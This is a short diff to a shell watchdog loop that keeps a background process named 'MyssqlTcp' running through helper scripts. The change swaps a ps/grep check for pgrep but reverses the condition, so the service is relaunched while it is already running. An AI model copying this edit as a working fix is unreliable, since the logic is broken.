@@ -11,10 +11,9 @@ if [ ! -d $HOME ]; then
 fi
 
 export LD_LIBRARY_PATH=$HOME/myssqltcp/
-
+monitoring_process="MyssqlTcp"
 while true; do
-        server=`ps aux | grep MyssqlTcp | grep -v grep`
-        if [ ! "$server" ]; then
+        if pgrep -x "$monitoring_process" > /dev/null; then
             ./addconf.sh
             /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
             sleep 10
